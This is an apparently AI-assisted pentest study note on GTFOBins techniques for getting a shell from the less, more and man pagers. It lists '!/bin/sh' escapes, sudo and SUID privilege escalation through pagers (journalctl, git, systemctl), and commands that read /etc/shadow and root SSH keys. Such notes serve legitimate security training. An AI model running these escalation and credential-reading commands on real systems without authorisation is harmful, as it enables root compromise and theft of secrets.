# Pagers (less / more / man)

**Tags:** `#less` `#more` `#man` `#pager` `#gtfobins` `#privesc` `#restrictedshellescape` `#sudo` `#suid`

Terminal pagers scroll long output a screen at a time. Security relevance is the same
[GTFOBins](https://gtfobins.github.io/) story as [[Tools/Command Shell/Vim|vim]] /
[[Tools/Command Shell/nano|nano]]: a pager can **run a shell command** (`!cmd`) or **open an
editor** (`v`), so any pager reached with `sudo`/SUID is an instant shell — and the catch is
you often land in a pager **without meaning to**, because `man`, `git`, `systemctl`,
`journalctl`, `less`-backed tools all pipe through one by default.

**GTFOBins:** [less](https://gtfobins.github.io/gtfobins/less/) · [more](https://gtfobins.github.io/gtfobins/more/) · [man](https://gtfobins.github.io/gtfobins/man/)
**Install:** `less`/`more` preinstalled everywhere; `man`/`man-db` nearly always present.

---

## The Escape

From inside any of these pagers, at the `:` / `--More--` prompt:

```
!/bin/sh          # run a shell (less, more, man all honor !command)
!bash
v                 # (less) open the file in $EDITOR — if that's vi/vim → :!/bin/sh
```

- **less** — `!/bin/sh` runs a shell; `v` opens `$EDITOR`; `-N`, `/pattern`, etc. don't matter.
- **more** — `!/bin/sh` works, **but only when `more` is actually paging** — i.e. the output is longer than the terminal. Shrink the window or feed a big file so it pauses.
- **man** — renders through a pager (usually `less`), so `!/bin/sh` from within a man page works: `man 7 ascii` then `!/bin/sh`. Or set the pager directly: `man -P /bin/sh man`.

---

## Privilege Escalation

### sudo → root

If `sudo -l` shows a pager **or any command that pages through one**:

```bash
sudo less /var/log/anything        # then:  !/bin/sh    → root
sudo more /var/log/anything        # (ensure it pages)  !/bin/sh
sudo man man                       #                     !/bin/sh
```

> [!warning] **The sneaky ones — commands that page for you.** A sudo rule on something that
> *isn't* obviously a shell still gives root if it pipes to a pager:
> ```bash
> sudo journalctl              # opens in less →  !/bin/sh   (GTFOBins journalctl)
> sudo git -p help             # pager →  !/bin/sh           (GTFOBins git)
> sudo systemctl status <svc>  # pager →  !sh
> ```
> Force paging (don't let output be short enough to skip the pager): resize the terminal
> small, or append nothing and scroll. Set `PAGER`/`SYSTEMD_PAGER` if the tool respects it.

### SUID pager → root

```bash
./less file        # then !/bin/sh   (spawned shell may keep euid; if not, use less's file read)
./more file
```

Also read root-only files directly: `sudo less /etc/shadow`, `sudo less /root/.ssh/id_rsa`.

### Restricted shells

A pager reachable from an `rbash`/menu shell is a common break-out — `!/bin/bash` from
inside `less`/`man` escapes the cage. See [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].

---

## Reading Untrusted Output Safely

The flip side: pagers interpret control bytes, so `less -r`/`-R` on a hostile file can trigger
terminal escape-sequence injection. Default `less`
sanitizes control chars — **don't** add `-r`/`-R` when viewing loot pulled off a target; prefer
`cat -v` / `hexdump -C`. (Full treatment in [[Tools/Command Shell/Terminator|Terminator]].)

---

## Quick Reference

| Goal | Command |
|---|---|
| Shell from a pager | `!/bin/sh` (at the pager prompt) |
| less → editor escape | `v` (opens `$EDITOR`) |
| sudo pager → root | `sudo less <file>` → `!/bin/sh` |
| sudo *hidden* pager → root | `sudo journalctl` / `sudo git -p help` → `!/bin/sh` |
| more needs to be paging | shrink terminal / big file, then `!/bin/sh` |
| man → shell | `man man` → `!/bin/sh`  (or `man -P /bin/sh man`) |
| Read root file | `sudo less /etc/shadow` |
| View loot safely | `cat -v file` / `hexdump -C file` (not `less -R`) |

---

> [!note] **See also** — editor siblings with the same GTFO story: [[Tools/Command Shell/Vim|Vim]], [[Tools/Command Shell/nano|nano]]; sudo/SUID enumeration + payloads [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]]; escape-sequence-injection defense [[Tools/Command Shell/Terminator|Terminator]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
